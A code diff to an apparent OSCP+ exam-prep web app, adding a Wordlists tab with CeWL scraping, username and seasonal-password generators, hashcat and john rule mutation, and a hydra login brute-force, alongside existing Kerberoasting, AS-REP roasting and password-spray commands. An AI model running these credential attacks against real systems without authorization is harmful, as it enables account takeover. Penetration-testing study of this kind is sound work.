@@ -1,7 +1,7 @@
 const { useState, useCallback, useMemo, useEffect, useRef } = window.React;
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// OSCP+ AUTOPILOT v3 — Decision Engine for OSCP+ 2025/2026
+// OSCP+ AUTOPILOT v4 — Decision Engine for OSCP+ 2026
 // Format: 1 AD Set (40pts) + 3 Standalones (60pts) = 100pts
 // Pass: 70pts | Assumed breach AD | 23h45m + 24h report
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -26,7 +26,7 @@ const AD_CHAIN = [
       { action: "Kerberoasting", cmd: (u,p,d,dc) => `# Get TGS tickets for service accounts:\nimpacket-GetUserSPNs '${d||"domain.local"}/${u||"user"}:${p||"password"}' -dc-ip ${dc||"DC_IP"} -request -outputfile kerberoast.txt\n\n# Crack them:\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`, check: "Service accounts often have weak passwords!", critical: true },
       { action: "AS-REP Roasting", cmd: (u,p,d,dc) => `# Find accounts with no pre-auth:\nimpacket-GetNPUsers '${d||"domain.local"}/${u||"user"}:${p||"password"}' -dc-ip ${dc||"DC_IP"} -request -outputfile asrep.txt\n\n# Crack them:\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`, check: "Accounts without Kerberos pre-auth?" },
       { action: "Search SYSVOL for creds", cmd: (u,p,d,dc) => `# GPP passwords (Group Policy Preferences):\ncrackmapexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -M gpp_password\n\n# Manual search:\nsmbclient //${dc||"DC_IP"}/SYSVOL -U '${d||"domain"}/${u||"user"}%${p||"password"}' -c 'recurse;prompt;mget *'\ngrep -ri password SYSVOL/ 2>/dev/null\nfind SYSVOL/ -name "*.xml" -exec grep -li "cpassword" {} \\;`, check: "GPP passwords? Scripts with creds?" },
-      { action: "Password spray", cmd: (u,p,d,dc) => `# Spray found passwords against all users:\ncrackmapexec smb ${dc||"DC_IP"} -u users.txt -p '${p||"password"}' -d '${d||"domain.local"}' --continue-on-success\n\n# Try common passwords:\ncrackmapexec smb ${dc||"DC_IP"} -u users.txt -p 'Season2025!' -d '${d||"domain.local"}' --continue-on-success\ncrackmapexec smb ${dc||"DC_IP"} -u users.txt -p 'Welcome1!' -d '${d||"domain.local"}' --continue-on-success`, check: "Password reuse? Common patterns?" },
+      { action: "Password spray", cmd: (u,p,d,dc) => `# Spray found passwords against all users:\ncrackmapexec smb ${dc||"DC_IP"} -u users.txt -p '${p||"password"}' -d '${d||"domain.local"}' --continue-on-success\n\n# Try common passwords:\ncrackmapexec smb ${dc||"DC_IP"} -u users.txt -p 'Season2026!' -d '${d||"domain.local"}' --continue-on-success\ncrackmapexec smb ${dc||"DC_IP"} -u users.txt -p 'Welcome1!' -d '${d||"domain.local"}' --continue-on-success`, check: "Password reuse? Common patterns?" },
     ]
   },
   {
@@ -99,6 +99,7 @@ const PORT_PLAYBOOKS = {
   80: { service: "HTTP", icon: "🌍", priority: "CRITICAL", steps: [
     { action: "Tech stack", cmd: (t) => `whatweb http://${t} -v && curl -I http://${t}`, check: "CMS? Framework? Server?", critical: true },
     { action: "Directory brute", cmd: (t) => `feroxbuster -u http://${t} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx,jsp,bak,old -o ferox_80.txt`, check: "Admin panels? Uploads? Backups?", critical: true },
+    { action: "CeWL custom wordlist", cmd: (t) => `# Build password wordlist from site content:\ncewl http://${t} -d 3 -m 5 --lowercase -w cewl_words.txt\n\n# Extract emails too:\ncewl http://${t} -d 3 -m 5 -e --email_file emails.txt\n\n# Mutate with hashcat rules:\nhashcat --stdout cewl_words.txt -r /usr/share/hashcat/rules/best64.rule | sort -u > custom_passwords.txt\n\n# Use for login brute-force:\nhydra -L users.txt -P custom_passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=failed" -s 80 -t 4`, check: "rockyou failed? Build context wordlist! See Wordlists tab" },
     { action: "VHost fuzzing", cmd: (t) => `gobuster vhost -u http://${t} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain`, check: "Add found domains to /etc/hosts" },
     { action: "Nikto", cmd: (t) => `nikto -h http://${t} -o nikto.txt`, check: "Known vulns? Misconfigs?" },
     { action: "Check hidden paths", cmd: (t) => `curl -s http://${t}/robots.txt; curl -s http://${t}/sitemap.xml\ncurl -s http://${t}/ | grep -iE '(href|src|action|comment|hidden|password|secret|api|key|token|admin|debug|TODO|FIXME)'`, check: "Disallowed paths? Leaked info?" },
@@ -1033,12 +1034,225 @@ powershell -c "(New-Object Net.WebClient).DownloadFile('http://${h}/chisel.exe',
   </div>)
 }
 
+// ━━━ TAB: WORDLISTS ━━━
+function WordlistTab({targetIP}){
+  const t=targetIP||"TARGET";
+  return(<div>
+    <div className="score-bar">
+      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)',flex:2}}>rockyou not cracking? Build context-based wordlists for the win.</div>
+    </div>
+
+    <div className="sec-title">When to Use What — Quick Reference</div>
+    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# ┌──────────────────────────────┬──────────────────────────────────────────────┐
+# │ SCENARIO                    │ WORDLIST                                     │
+# ├──────────────────────────────┼──────────────────────────────────────────────┤
+# │ Hash cracking (offline)     │ rockyou.txt                                  │
+# │ Dir/file brute-force        │ raft-medium-directories / dir-2.3-medium     │
+# │ Login brute with context    │ CeWL output + hashcat rules                  │
+# │ Username enumeration        │ Custom (from recon) + xato-net-10-million    │
+# │ Subdomain brute             │ subdomains-top1million-5000.txt              │
+# │ Password spray (AD)         │ Context words + Season+Year patterns         │
+# │ Kerberoast / AS-REP crack   │ rockyou.txt → custom if fails                │
+# │ API parameter fuzz          │ burp-parameter-names.txt                     │
+# │ VHost discovery             │ subdomains-top1million-5000.txt              │
+# └──────────────────────────────┴──────────────────────────────────────────────┘
+#
+# GOLDEN RULE: If rockyou doesn't crack it in 2-5 min, STOP.
+# → Build a custom wordlist OR brute-force is NOT the path.`}</div></div>
+
+    <div className="sec-title">CeWL — Build Wordlist from Target Website</div>
+    <div className="gen-out"><div className="cmd">{`# Basic extraction (words from site):
+cewl http://${t} -d 3 -m 5 -w cewl_words.txt
+
+# Lowercase all words:
+cewl http://${t} -d 3 -m 5 --lowercase -w cewl_words.txt
+
+# Also extract emails (for usernames):
+cewl http://${t} -d 3 -m 5 -e --email_file emails.txt -w cewl_words.txt
+
+# Include meta data (author names, etc.):
+cewl http://${t} -d 3 -m 5 --meta --meta_file meta.txt -w cewl_words.txt
+
+# HTTPS target (skip cert verify):
+cewl https://${t} -d 3 -m 5 -w cewl_words.txt --unsafe
+
+# Options:
+#   -d N     = crawl depth (default 2, use 3-5)
+#   -m N     = minimum word length
+#   -w FILE  = output file
+#   -e       = include emails
+#   --lowercase = force lowercase`}</div>
+      <div style={{marginTop:8}}><CopyBtn text={`cewl http://${t} -d 3 -m 5 --lowercase -w cewl_words.txt`}/></div>
+    </div>
+
+    <div className="sec-title">Username Generation from Discovered Names</div>
+    <div className="gen-out"><div className="cmd">{`# Found names? (from website, emails, SNMP, LDAP, LinkedIn)
+# Generate ALL common username formats:
+
+cat << 'SCRIPT' > /tmp/gen_users.sh
+#!/bin/bash
+# Usage: ./gen_users.sh "John Smith"
+first=$(echo "$1" | awk '{print tolower($1)}')
+last=$(echo "$1"  | awk '{print tolower($2)}')
+fi=$(echo "$first" | cut -c1)
+li=$(echo "$last"  | cut -c1)
+echo "$first"           # john
+echo "$last"            # smith
+echo "$first.$last"     # john.smith
+echo "$first$last"      # johnsmith
+echo "$fi$last"         # jsmith
+echo "$fi.$last"        # j.smith
+echo "$first$li"        # johns
+echo "$last$fi"         # smithj
+echo "$first._$last"    # john_smith
+SCRIPT
+chmod +x /tmp/gen_users.sh
+
+# Generate for multiple names:
+for name in "John Smith" "Jane Doe" "Bob Admin"; do
+  /tmp/gen_users.sh "$name"
+done | sort -u > users.txt
+
+# Quick one-liner:
+n="John Smith"; f=$(echo $n|awk '{print tolower($1)}'); l=$(echo $n|awk '{print tolower($2)}'); echo -e "$f\\n$l\\n$f.$l\\n$(echo $f|cut -c1)$l" | sort -u`}</div>
+      <div style={{marginTop:8}}><CopyBtn text={`n="John Smith"; f=$(echo $n|awk '{print tolower($1)}'); l=$(echo $n|awk '{print tolower($2)}'); echo -e "$f\\n$l\\n$f.$l\\n$(echo $f|cut -c1)$l" | sort -u`}/></div>
+    </div>
+
+    <div className="sec-title">Custom Password Generation (Context-Based)</div>
+    <div className="gen-out"><div className="cmd">{`# 1. Create base wordlist from context:
+# Company name, city, domain, usernames, keywords from recon
+cat << 'EOF' > base_words.txt
+companyname
+cityname
+domainname
+admin
+backup
+server
+EOF
+
+# 2. Generate mutations:
+for word in $(cat base_words.txt); do
+  W=$(echo "$word" | sed 's/./\\U&/')  # Capitalize first
+  echo "$word"
+  echo "$W"
+  echo "$word" | tr '[:lower:]' '[:upper:]'
+  for suffix in 1 123 ! @ "!" "@123" "@2026" "!2026" 2024 2025 2026; do
+    echo "$word$suffix"
+    echo "$W$suffix"
+  done
+done | sort -u > custom_passwords.txt
+
+# 3. Count:
+wc -l custom_passwords.txt`}</div>
+      <div style={{marginTop:8}}><CopyBtn text={`for word in $(cat base_words.txt); do W=$(echo "$word" | sed 's/./\\U&/'); echo "$word"; echo "$W"; for s in 1 123 "!" "@123" "@2026" "!2026" 2025 2026; do echo "$word$s"; echo "$W$s"; done; done | sort -u > custom_passwords.txt`}/></div>
+    </div>
+
+    <div className="sec-title">Hashcat Rule-based Mutation</div>
+    <div className="gen-out"><div className="cmd" style={{color:'var(--cg)'}}>{`# ─── GENERATE MUTATED WORDLIST (to file) ───
+hashcat --stdout base_words.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
+hashcat --stdout base_words.txt -r /usr/share/hashcat/rules/rockyou-30000.rule > mutated_big.txt
+
+# ─── APPLY RULES DURING CRACKING ───
+hashcat -m MODE hash.txt base_words.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m MODE hash.txt base_words.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+
+# ─── COMBINE / HYBRID ATTACKS ───
+hashcat -m MODE hash.txt -a 1 wordlist1.txt wordlist2.txt    # Combine two lists
+hashcat -m MODE hash.txt -a 6 wordlist.txt ?d?d?d?d         # Append 4 digits
+hashcat -m MODE hash.txt -a 7 ?u wordlist.txt               # Prepend uppercase
+
+# ─── RULE FILES (Kali paths) ───
+# /usr/share/hashcat/rules/best64.rule         — Fast, most common
+# /usr/share/hashcat/rules/rockyou-30000.rule  — Aggressive
+# /usr/share/hashcat/rules/d3ad0ne.rule        — Very large
+# /usr/share/hashcat/rules/InsidePro-PasswordProRules.rule
+
+# ─── CeWL → MUTATE → CRACK PIPELINE ───
+cewl http://${t} -d 3 -m 5 --lowercase -w cewl.txt
+hashcat -m MODE hash.txt cewl.txt -r /usr/share/hashcat/rules/best64.rule`}</div>
+      <div style={{marginTop:8}}><CopyBtn text={`hashcat --stdout base_words.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt`}/></div>
+    </div>
+
+    <div className="sec-title">John the Ripper Rules</div>
+    <div className="gen-out"><div className="cmd">{`# Apply rules during cracking:
+john --wordlist=base_words.txt --rules=best64 hash.txt
+john --wordlist=base_words.txt --rules=All hash.txt
+
+# Generate mutated wordlist to stdout:
+john --wordlist=base_words.txt --rules=best64 --stdout > mutated.txt
+john --wordlist=base_words.txt --rules=KoreLogic --stdout > mutated_big.txt
+
+# CeWL + john pipeline:
+cewl http://${t} -d 3 -m 5 --lowercase -w cewl.txt
+john --wordlist=cewl.txt --rules=best64 hash.txt`}</div></div>
+
+    <div className="sec-title">Common OSCP Password Patterns</div>
+    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# ── FREQUENTLY SEEN IN OSCP ──
+#
+# Season + Year:   Spring2025!, Summer2026!, Winter2025!
+# Month + Year:    January2025!, March2026!
+# Company + Num:   CompanyName1!, Corp2025!
+# User + Num:      username1, admin123, user2026!
+# Keyboard walks:  qwerty, P@ssw0rd, Passw0rd!
+# Defaults:        password, Password1, Welcome1!, changeme
+#
+# ── QUICK SEASONAL GENERATOR ──
+for s in Spring Summer Autumn Winter; do
+  for y in 2024 2025 2026; do
+    for c in "" "!" "@" "#" "123"; do
+      echo "$s$y$c"
+    done
+  done
+done > season_passwords.txt
+
+# ── MONTH VARIANT ──
+for m in January February March April May June July August September October November December; do
+  for y in 2024 2025 2026; do
+    echo "$m$y"; echo "$m$y!"
+  done
+done >> season_passwords.txt
+
+echo "Generated $(wc -l < season_passwords.txt) password candidates"`}</div>
+      <div style={{marginTop:8}}><CopyBtn text={`for s in Spring Summer Autumn Winter; do for y in 2024 2025 2026; do for c in "" "!" "@" "#" "123"; do echo "$s$y$c"; done; done; done > season_passwords.txt`}/></div>
+    </div>
+
+    <div className="sec-title">Wordlist Paths Reference (Kali)</div>
+    <div className="gen-out"><div className="cmd">{`# ── PASSWORDS ──
+/usr/share/wordlists/rockyou.txt                                        # 14M passwords
+/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+/usr/share/seclists/Passwords/darkweb2017-top10000.txt
+
+# ── USERNAMES ──
+/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+/usr/share/seclists/Usernames/top-usernames-shortlist.txt
+/usr/share/seclists/Usernames/Names/names.txt
+
+# ── WEB DIRECTORIES ──
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt
+/usr/share/wordlists/dirb/big.txt
+
+# ── DNS / SUBDOMAINS ──
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+
+# ── SNMP ──
+/usr/share/seclists/Discovery/SNMP/snmp.txt
+
+# ── PARAMETERS ──
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`}</div></div>
+
+  </div>)
+}
+
 // ━━━ TAB: I'M STUCK ━━━
 function StuckTab(){
   const checks=[
     { q: "Did you scan ALL 65535 TCP ports?", cmd: "nmap -p- --min-rate 5000 TARGET", tip: "Many OSCP boxes hide services on high ports (8000-65535). A top-1000 scan WILL miss them.", critical: true },
     { q: "Did you scan UDP?", cmd: "sudo nmap -sU --top-ports 20 TARGET", tip: "SNMP (161) is the #1 missed port. It can leak usernames, running processes, and installed software.", critical: true },
     { q: "Did you try ALL found creds on ALL services?", cmd: "crackmapexec smb TARGETS -u users.txt -p passwords.txt --continue-on-success", tip: "Password reuse is VERY common. Try every credential on SSH, SMB, WinRM, RDP, web apps, databases.", critical: true },
+    { q: "Did you build a CONTEXT-BASED wordlist?", cmd: "cewl http://TARGET -d 3 -m 5 --lowercase -w cewl.txt\nhashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > custom.txt", tip: "If rockyou didn't crack it in 5 min, STOP. Use CeWL to scrape the target site, add company names, usernames, year/season patterns. Mutate with hashcat rules. See the Wordlists tab.", critical: true },
     { q: "Did you Google the EXACT version?", cmd: "searchsploit 'ServiceName Version'\n# Also: Google 'ServiceName Version exploit'", tip: "Many boxes use services with known CVEs. Search: 'Apache 2.4.49 exploit', 'vsftpd 2.3.4 backdoor', etc." },
     { q: "Did you read the source code?", cmd: "# View page source in browser\n# Look for: comments, hidden fields, JS files, API endpoints\ncurl -s http://TARGET/ | grep -iE '(comment|hidden|api|key|token|secret|password|TODO|FIXME|href|src)'", tip: "Comments in HTML/JS often leak paths, creds, or hints." },
     { q: "Did you check for VHosts/subdomains?", cmd: "gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain\n# Also check /etc/hosts or DNS zone transfer", tip: "Different vhosts can have completely different applications." },
@@ -1096,6 +1310,7 @@ const TABS=[
   {id:"privesc",label:"Priv Esc",icon:"⬆️"},
   {id:"tunnel",label:"Pivoting",icon:"🔀"},
   {id:"shells",label:"Shells",icon:"💀"},
+  {id:"wordlists",label:"Wordlists",icon:"🔤"},
   {id:"hash",label:"Hash ID",icon:"#️⃣"},
   {id:"stuck",label:"I'm Stuck",icon:"🆘"},
   {id:"timer",label:"Timer",icon:"⏱️"},
@@ -1113,7 +1328,7 @@ function App(){
     <style>{CSS}</style>
     <div className="app">
       <div className="hdr">
-        <div><div className="logo">OSCP+ AUTOPILOT</div><div className="logo-sub">Decision Engine — OSCP+ 2025/2026</div></div>
+        <div><div className="logo">OSCP+ AUTOPILOT</div><div className="logo-sub">Decision Engine — OSCP+ 2026</div></div>
         <div className="inps">
           <input className="inp" style={{width:130}} placeholder="Target IP" value={targetIP} onChange={e=>setTargetIP(e.target.value)}/>
           <input className="inp" style={{width:130}} placeholder="Your IP (LHOST)" value={lhost} onChange={e=>setLhost(e.target.value)}/>
@@ -1128,6 +1343,7 @@ function App(){
         {tab==="privesc"&&<PrivEscTab lhost={lhost}/>}
         {tab==="tunnel"&&<TunnelingTab lhost={lhost}/>}
         {tab==="shells"&&<ShellTab lhost={lhost} lport={lport}/>}
+        {tab==="wordlists"&&<WordlistTab targetIP={targetIP}/>}
         {tab==="hash"&&<HashTab/>}
         {tab==="stuck"&&<StuckTab/>}
         {tab==="timer"&&<TimerTab/>}
